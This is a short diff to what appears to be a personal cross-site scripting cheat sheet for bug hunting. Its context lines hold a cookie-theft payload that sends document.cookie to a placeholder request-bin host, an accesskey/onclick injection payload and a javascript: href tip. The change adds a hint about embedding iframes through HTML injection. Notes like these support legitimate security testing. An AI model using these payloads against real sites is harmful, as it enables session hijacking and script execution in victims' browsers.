@@ -202,4 +202,4 @@ document.write("<img src='https://your_request_bin_url?c=" + document.cookie + "
 - even if the element isn't visible in the web site it still be vulnerable to XSS for ex  the website takes the URL and put it in `a` tag in the `head` so it's not visible so we can use that payload `https://victim.com?'accesskey='x'onclick='alert(1)` so when the user press ALT +X the payload will execute  '
 -  - if the payload is inserted in a href    you can use `javascript:payload`
 - if you found xss try to find failure to invalidate session on logout
-- 
+- if you found HTML injection try to embed an iframe inside it 
